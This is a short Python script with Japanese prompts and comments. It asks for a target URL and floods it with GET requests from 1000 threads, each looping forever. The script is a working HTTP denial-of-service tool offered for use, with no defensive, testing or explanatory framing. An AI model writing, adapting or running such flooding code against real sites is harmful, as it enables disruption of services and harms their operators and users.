import threading
import requests

TARGET = input("ターゲットURL: ")

session=requests.Session()

COUNT= 1000
def attack():
    while True:
        try:
            for _ in range(COUNT):
                session.get(TARGET)
            print(f"{COUNT}回リクエスト送信")
        except Exception as e:
            print(f"エラー: {e}")
            
THREADS=1000#スレッド数同時接続
for _ in range(THREADS):
    t = threading.Thread(target=attack)
    t.start()

for t in threading.enumerate():
    if t is not threading.main_thread():
        t.join()
print("FINISHED")